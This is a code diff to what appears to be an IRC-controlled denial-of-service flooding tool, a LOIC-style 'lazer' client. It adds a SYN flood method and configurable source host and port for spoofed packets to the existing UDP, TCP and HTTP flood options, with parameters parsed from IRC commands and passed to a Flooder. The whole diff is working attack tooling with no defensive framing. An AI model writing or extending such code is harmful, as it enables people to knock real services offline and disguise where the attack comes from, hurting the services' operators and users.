@@ -10,6 +10,7 @@ START = 2
 UDP_METHOD = 0
 TCP_METHOD = 1
 HTTP_METHOD = 2
+SYN_METHOD = 3
 
 status = NEED_INFO
 flooder = None
@@ -25,10 +26,12 @@ threads = 1
 wait = None
 random = None
 speed = None
+srchost = None
+srcport = None
 
 
 def lazerParseHook(event):
-    global status, flooder, targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed
+    global status, flooder, targetip, targethost, timeout, subsite, message, port, method, threads, wait, random, speed, srchost, srcport
     print event.arg
 
     s = []
@@ -48,6 +51,8 @@ def lazerParseHook(event):
                 method = TCP_METHOD
                 speed = 0
                 random = False
+                srchost = "192.168.0.1"
+                srcport = 4321
 
     print "Splitting finished, status:", status
 
@@ -74,10 +79,12 @@ def lazerParseHook(event):
                     port = None
         elif s[x] == "method":
             method = s[x+1]
-            if method == "UDP":
+            if method.upper() == "UDP":
                 method = UDP_METHOD
-            elif method == "HTTP":
+            elif method.upper() == "HTTP":
                 method = HTTP_METHOD
+            elif method.upper() == "SYN":
+                method = SYN_METHOD
             else:
                 method = TCP_METHOD
         elif s[x] == "threads":
@@ -106,6 +113,13 @@ def lazerParseHook(event):
                     speed = 20
                 elif speed < 1:
                     speed = 1
+        elif s[x] == "srchost":
+            srchost = s[x+1]
+        elif s[x] == "srcport":
+            if s[x+1].isdigit():
+                srcport = int(s[x+1])
+                if(srcport < -1):
+                    srcport = None
 
     print "parsing finished"
 
@@ -142,7 +156,7 @@ def lazerStartHook(event):
         else:
             host = targetip
 
-        flooder = Flooder(host, port, timeout, method, threads, subsite, message, random, wait)
+        flooder = Flooder(host, port, timeout, method, threads, subsite, message, random, wait, srchost, srcport)
         flooder.start()
 
 irc = None
